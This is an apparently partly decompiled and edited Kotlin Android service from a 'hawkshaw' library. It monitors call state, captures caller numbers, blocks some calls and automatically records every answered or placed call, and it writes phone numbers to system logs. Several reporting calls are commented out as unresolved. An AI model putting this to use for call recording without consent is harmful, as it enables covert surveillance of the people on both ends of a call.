package com.hawkshaw.library.features.telephony

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.telephony.PhoneStateListener
import android.telephony.TelephonyCallback
import android.telephony.TelephonyManager
import android.util.Log // Added for Log.d
import androidx.annotation.RequiresApi
import com.hawkshaw.library.App
import com.hawkshaw.library.datalayer.models.CallInfo
import com.hawkshaw.library.datalayer.models.CallType
import com.hawkshaw.library.features.telephony.CallRecorder
import com.hawkshaw.library.ktextensions.ManifestPermissionsKt.hasPermission
import com.hawkshaw.library.ktextensions.safeLaunch
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob

/**
 * Service to monitor telephony state changes
 */
class TelephonyCallbackService : Service() {

    companion object {
        private const val TAG = "TelephonyCallbackSvc" // Shorter tag for logs

        /**
         * Converts a TelephonyManager call state integer to a human-readable string.
         *
         * @param state The integer call state.
         * @return A string representation of the call state.
         */
        fun toStateString(state: Int): String {
            return when (state) {
                TelephonyManager.CALL_STATE_IDLE -> "IDLE"
                TelephonyManager.CALL_STATE_RINGING -> "RINGING"
                TelephonyManager.CALL_STATE_OFFHOOK -> "OFFHOOK"
                else -> "UNKNOWN ($state)"
            }
        }
    }

    private var phoneNumber: String? = null
    private var lastState: Int = TelephonyManager.CALL_STATE_IDLE
    private var isOutgoing = false

    private val tm: TelephonyManager by lazy {
        Log.d(TAG, "Initializing TelephonyManager")
        getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
    }

    private val callBlocker: CallBlocker by lazy { // Assuming CallBlocker could be lazy too if complex
        Log.d(TAG, "Initializing CallBlocker")
        CallBlocker
    }
    private val callRecorder: CallRecorder by lazy {
        Log.d(TAG, "Initializing CallRecorder")
        CallRecorder(this)
    }

    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.Main)

    private val callStateListener: TelephonyCallback by lazy {
        Log.d(TAG, "Creating TelephonyCallback (for SDK S+)")
        @RequiresApi(Build.VERSION_CODES.S)
        object : TelephonyCallback(), TelephonyCallback.CallStateListener {
            override fun onCallStateChanged(state: Int) {
                // Use Companion.toStateString for clarity
                Log.d(TAG, "TelephonyCallback.onCallStateChanged (S+) - State: ${Companion.toStateString(state)}")
                this@TelephonyCallbackService.onCallStateChanged(state)
            }
        }
    }

    @Suppress("DEPRECATION") // Suppress for the PhoneStateListener usage below S
    private val phoneStateListener: PhoneStateListener by lazy {
        Log.d(TAG, "Creating PhoneStateListener (for < SDK S)")
        object : PhoneStateListener() {
            // @Deprecated("Used for pre-S SDKs") // This was for the specific override, Supress on property is broader
            override fun onCallStateChanged(state: Int, incomingNumber: String?) {
                 // Use Companion.toStateString for clarity
                Log.d(TAG, "PhoneStateListener.onCallStateChanged (<S) - State: ${Companion.toStateString(state)}, Number: $incomingNumber")
                if (!incomingNumber.isNullOrBlank()) {
                    Log.d(TAG, "PhoneStateListener: Updating phoneNumber to $incomingNumber")
                    this@TelephonyCallbackService.phoneNumber = incomingNumber
                }
                this@TelephonyCallbackService.onCallStateChanged(state)
            }
        }
    }

    private fun onCallStateChanged(state: Int) {
        // Use Companion.toStateString for clarity
        Log.d(TAG, "onCallStateChanged - Current State: ${Companion.toStateString(state)}, Last State: ${Companion.toStateString(lastState)}, Phone: $phoneNumber, IsOutgoing: $isOutgoing")
        serviceScope.safeLaunch {
            Logger.d(TAG, "onCallStateChanged Coroutine - State: ${Companion.toStateString(state)}, Number: $phoneNumber",false, 4,null)

            when (state) {
                TelephonyManager.CALL_STATE_RINGING -> {
                    Log.d(TAG, "CALL_STATE_RINGING - Number: $phoneNumber")
                    isOutgoing = false
                    if (phoneNumber != null && callBlocker.onCallStateChanged(state, phoneNumber)) {
                        Log.i(TAG, "CALL_STATE_RINGING - Call BLOCKED for $phoneNumber")
                        Logger.d(TAG, "Blocked incoming call from $phoneNumber", false, 4, null)
                        return@safeLaunch
                    }
                    Log.d(TAG, "CALL_STATE_RINGING - Pushing CallInfo: INCOMING, Started=true")
                    // App.pushCallInfo(CallInfo(phoneNumber = phoneNumber, callType = CallType.INCOMING, isStarted = true)) // ERROR: Unresolved reference
                }

                TelephonyManager.CALL_STATE_OFFHOOK -> {
                    if (lastState != TelephonyManager.CALL_STATE_RINGING) {
                        Log.d(TAG, "CALL_STATE_OFFHOOK - Transitioned from non-RINGING state. Marking as OUTGOING.")
                        isOutgoing = true
                    } else {
                        Log.d(TAG, "CALL_STATE_OFFHOOK - Transitioned from RINGING state (INCOMING answered).")
                        isOutgoing = false // Explicitly mark as not outgoing if it was ringing
                    }
                    Log.d(TAG, "CALL_STATE_OFFHOOK - Number: $phoneNumber, IsOutgoing: $isOutgoing")

                    if (isOutgoing && phoneNumber != null && callBlocker.onCallStateChanged(state, phoneNumber)) {
                        Log.i(TAG, "CALL_STATE_OFFHOOK - Outgoing call BLOCKED for $phoneNumber")
                        Logger.d(TAG, "Blocked outgoing call to $phoneNumber", false, 4, null)
                        return@safeLaunch
                    }

                    if (phoneNumber != null && callRecorder.isCallRecordingAvailable()) {
                        Log.i(TAG, "CALL_STATE_OFFHOOK - Recording available. Starting recording for $phoneNumber")
                        callRecorder.startRecordingInstance(phoneNumber!!) // CORRECTED METHOD NAME
                    } else {
                        Log.i(TAG, "CALL_STATE_OFFHOOK - Call recording NOT available or phone number is null.")
                    }
                    Log.d(TAG, "CALL_STATE_OFFHOOK - Pushing CallInfo: Type=${if (isOutgoing) CallType.OUTGOING else CallType.INCOMING}, Started=true")
                    // App.pushCallInfo(CallInfo(phoneNumber = phoneNumber, callType = if (isOutgoing) CallType.OUTGOING else CallType.INCOMING, isStarted = true)) // ERROR: Unresolved reference
                }

                TelephonyManager.CALL_STATE_IDLE -> {
                    Log.d(TAG, "CALL_STATE_IDLE - Last State: ${Companion.toStateString(lastState)}, Number: $phoneNumber")
                    if (lastState == TelephonyManager.CALL_STATE_RINGING) {
                        Log.i(TAG, "CALL_STATE_IDLE - Was RINGING (MISSED call) for $phoneNumber")
                        // App.pushCallInfo(CallInfo(phoneNumber = phoneNumber, callType = CallType.MISSED, isStarted = false)) // ERROR: Unresolved reference
                    } else if (lastState == TelephonyManager.CALL_STATE_OFFHOOK) {
                        Log.i(TAG, "CALL_STATE_IDLE - Was OFFHOOK (Call ENDED) for $phoneNumber. IsOutgoing: $isOutgoing")
                        callRecorder.stopRecordingInstance() // CORRECTED METHOD NAME
                        Log.d(TAG, "CALL_STATE_IDLE - Pushing CallInfo: Type=${if (isOutgoing) CallType.OUTGOING else CallType.INCOMING}, Started=false")
                        // App.pushCallInfo(CallInfo(phoneNumber = phoneNumber, callType = if (isOutgoing) CallType.OUTGOING else CallType.INCOMING, isStarted = false)) // ERROR: Unresolved reference
                    }
                    phoneNumber = null // Reset phone number on IDLE
                    isOutgoing = false // Reset outgoing flag
                }
                else -> Log.w(TAG, "onCallStateChanged - Unknown state: $state")
            }
            Log.d(TAG, "onCallStateChanged - Updating lastState to ${Companion.toStateString(state)}")
            lastState = state
        }
    }

    // toStateString moved to Companion object

    private fun registerTelephonyCallback() {
        Log.i(TAG, "Registering telephony callback. SDK: ${Build.VERSION.SDK_INT}")
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                Log.d(TAG, "Registering TelephonyCallback for SDK S+")
                tm.registerTelephonyCallback(applicationContext.mainExecutor, callStateListener)
            } else {
                Log.d(TAG, "Registering PhoneStateListener for SDK < S")
                @Suppress("DEPRECATION")
                tm.listen(phoneStateListener, PhoneStateListener.LISTEN_CALL_STATE)
            }
        } catch (e: SecurityException) {
            Log.e(TAG, "SecurityException while registering callback: ${e.message}", e)
            Logger.e(TAG, "SecurityException on register: ${e.localizedMessage}", e, false, 12, null)
            stopSelf() // Stop service if permission issue during registration
        } catch (e: Exception) {
            Log.e(TAG, "Exception while registering callback: ${e.message}", e)
            Logger.e(TAG, "Exception on register: ${e.localizedMessage}", e, false, 12, null)
            stopSelf()
        }
    }

    override fun onCreate() {
        super.onCreate()
        Log.i(TAG, "onCreate - Service creating")
        if (hasPermission("android.permission.READ_PHONE_STATE")) {
            Log.d(TAG, "onCreate - READ_PHONE_STATE permission GRANTED.")
            registerTelephonyCallback()
        } else {
            Log.w(TAG, "onCreate - READ_PHONE_STATE permission DENIED. Stopping service.")
            Logger.e(TAG, "onCreate: READ_PHONE_STATE permission denied.", null, false, 12, null)
            stopSelf()
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Log.i(TAG, "onStartCommand - Intent: $intent, Flags: $flags, StartId: $startId")
        intent?.getStringExtra("incoming_number")?.let { number ->
            if (number.isNotBlank()) {
                Log.d(TAG, "onStartCommand - Received incoming_number: $number. Updating phoneNumber.")
                phoneNumber = number
            }
        }
        // START_STICKY or START_NOT_STICKY depending on desired behavior for restarts
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.i(TAG, "onDestroy - Service destroying. SDK: ${Build.VERSION.SDK_INT}")
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                Log.d(TAG, "Unregistering TelephonyCallback for SDK S+")
                tm.unregisterTelephonyCallback(callStateListener)
            } else {
                Log.d(TAG, "Unregistering PhoneStateListener for SDK < S")
                @Suppress("DEPRECATION")
                tm.listen(phoneStateListener, PhoneStateListener.LISTEN_NONE)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Exception while unregistering callback: ${e.message}", e)
            Logger.e(TAG, "Exception on unregister: ${e.localizedMessage}", e, false, 12, null)
        }
        Log.d(TAG, "onDestroy - Service destroyed.")
    }

    override fun onBind(intent: Intent?): IBinder? {
        Log.d(TAG, "onBind - Called with intent: $intent. Returning null as binding is not supported.")
        return null
    }
}
